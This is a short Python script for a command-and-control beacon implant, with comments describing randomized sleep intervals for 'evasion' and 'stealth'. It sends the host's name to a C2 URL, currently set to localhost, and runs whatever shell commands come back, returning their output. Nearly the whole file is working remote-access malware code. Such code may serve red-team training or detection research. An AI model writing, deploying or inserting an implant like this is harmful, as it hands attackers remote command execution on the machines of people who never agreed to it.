import requests
import time
import json
import os
import random
import subprocess

# Configuration for the beacon
BEACON_URL = "http://localhost:8000/beacon"
SLEEP_TIME = 30  # Time in seconds between beacon callbacks
MIN_SLEEP = 30  # Randomized sleep lower bound for evasion
MAX_SLEEP = 90  # Randomized sleep upper bound for evasion

def check_in():
    """Send a beacon to the C2 server and check for tasks."""
    hostname = os.uname()[1]  
    data = {'hostname': hostname}
    
    try:
        response = requests.post(BEACON_URL, json=data)
        if response.status_code == 200:
            tasks = response.json().get('tasks', [])
            for task in tasks:
                handle_task(task)
        else:
            print("No tasks from C2 server.")
    except Exception as e:
        print(f"Failed to check in: {e}")

def handle_task(task):
    """Handle a task received from the C2 server."""
    task_type = task.get('type')
    command = task.get('command')

    if task_type == 'run_command':
        result = subprocess.run(command, shell=True, capture_output=True)
        send_result(result.stdout.decode())

def send_result(result):
    """Send the result of a task back to the C2 server."""
    try:
        requests.post(f"{BEACON_URL}/result", json={'result': result})
    except Exception as e:
        print(f"Failed to send result: {e}")

if __name__ == "__main__":
    while True:
        check_in()
        sleep_time = random.randint(MIN_SLEEP, MAX_SLEEP)
        time.sleep(sleep_time)  # Random sleep interval for stealth
